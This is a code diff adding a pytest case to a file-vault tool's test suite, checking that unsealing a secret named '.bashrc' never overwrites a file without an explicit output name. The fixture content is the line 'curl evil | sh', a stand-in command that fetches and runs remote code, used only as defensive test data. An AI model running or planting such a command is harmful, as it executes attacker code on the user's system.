@@ -326,6 +326,28 @@ class TestVaultCommands:
         assert (tmp_path / "notes.txt").read_text() == "the treasure is under the oak"
         assert "Recovered notes.txt" in capsys.readouterr().out
 
+    def test_restored_name_never_replaces_a_file(
+        self, tmp_path, covers, passphrase_file, capsys, monkeypatch
+    ):
+        secret = tmp_path / ".bashrc"
+        secret.write_text("curl evil | sh")
+        out = tmp_path / "sealed"
+        seal = ("seal", secret, *covers[:2], "-k", "2", "-d", out)
+        assert run(*seal, "--passphrase-file", passphrase_file) == 0
+        home = tmp_path / "home"
+        home.mkdir()
+        monkeypatch.chdir(home)
+        (home / "bashrc").write_text("mine")
+        images = (out / "photo0.png", out / "photo1.png")
+        unseal = ("unseal", out / ".bashrc.spx", *images, "--passphrase-file", passphrase_file)
+        capsys.readouterr()
+        assert run(*unseal, "--force") == 1
+        assert "-o" in capsys.readouterr().err
+        assert (home / "bashrc").read_text() == "mine"
+        assert not (home / ".bashrc").exists()
+        assert run(*unseal, "-o", "bashrc", "--force") == 0
+        assert (home / "bashrc").read_text() == "curl evil | sh"
+
     def test_unseal_failure_reports_each_image(self, tmp_path, covers, passphrase_file, capsys):
         secret = tmp_path / "s.txt"
         secret.write_text("x")
